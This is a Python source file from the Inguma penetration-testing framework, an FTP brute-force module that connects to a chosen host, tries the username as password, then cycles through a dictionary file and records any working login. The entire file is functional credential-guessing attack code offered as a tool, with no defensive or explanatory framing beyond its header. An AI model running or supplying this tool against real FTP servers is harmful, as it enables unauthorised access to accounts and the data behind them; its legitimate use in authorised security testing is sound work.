#!/usr/bin/python

"""
FTP brute force module for Inguma
Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>

License is GPL v2
"""

import os
import sys
import time
import string
import ftplib

name = "bruteftp"
brief_description = "A simple FTP brute force tool"
type = "gather"

class CFtpBrute:

	target = ""
	waitTime = 0
	timeout = 1
	exploitType = 3
	services = ""
	results = {}
	user = ""
	port = 0

	def __init__(self):
		self.ftp = None
		self.tid = None
		self.pwd = ''
		self.share = None

	def help(self):
		print "target = <target host or network>"
		print "port = <target port>"
		print "user = <username>"

	def addToDict(self, element, value):
		""" It's used to add data to the knowledge base to be used, i.e., by other modules """
		if value == None:
			return

		if self.dict is not None:
			if self.dict.has_key(element):
			
				for x in self.dict[element]:
					if x == value:
						return

				self.dict[element] += [value]
			else:
				self.dict[element] = [value]

	def getPasswordList(self):
		fname = self.dict["base_path"]
		if fname != "" :
			fname += os.sep + "data" + os.sep + "dict"
		else:
			fname = "data" + os.sep + "dict"

		f = file(fname, "r")
		return f.readlines()

	def bruteForce(self):
		userList = [self.user, ]
		if self.port == 0:
			self.port = 21

		self.open(self.target, self.port)

		try:
			#sys.stdout.write("Trying " + self.user + "/" + self.user)
			self.gom.echo( "Trying " + self.user + "/" + self.user )
			self.login(self.user, self.user)
			self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
			self.results[self.user] = self.user
			return True
		except:
			# Well, first try :)
			pass

		for user in userList:
			for passwd in self.getPasswordList():
				time.sleep(self.waitTime)
				try:
					passwd = passwd.replace("\n", "").replace("\r", "")
					self.gom.echo( "Trying " + user + "/" + passwd + "..." )
					self.login(user, passwd)
					self.addToDict(self.target + "_passwords", self.user + "/" + passwd)
					self.results[user] = passwd

					return True
				except KeyboardInterrupt:
					self.gom.echo( "Aborted." )
					return False
				except:
					pass

		return False

	def run(self):
		if self.target == "":
			self.gom.echo( "No target specified" )
			return False
		
		if self.user == "":
			self.gom.echo( "No user specified" )
			return False

		self.bruteForce()
		return True

	def printSummary(self):
		self.gom.echo( "" )
		for x in self.results:
			self.gom.echo( x + "/" + self.results[x] + "\n" )

	def open(self,host,port):
		self.ftp = ftplib.FTP()
		self.ftp.connect(host, port)

	def login(self,username, password):
		if not self.ftp:
			self.gom.echo( "Open a connection first." )

		self.ftp.login(username, password)

	def login_hash(self,username, lmhash, nthash):
		self.gom.echo( "Not yet applicable" )

	def logoff(self):
		if not self.ftp:
			self.gom.echo( "Open a connection first." )

		self.ftp.close()
		self.ftp = None

	def close(self):
		if not self.ftp:
			self.gom.echo( "Open a connection first." )

		self.ftp.close();
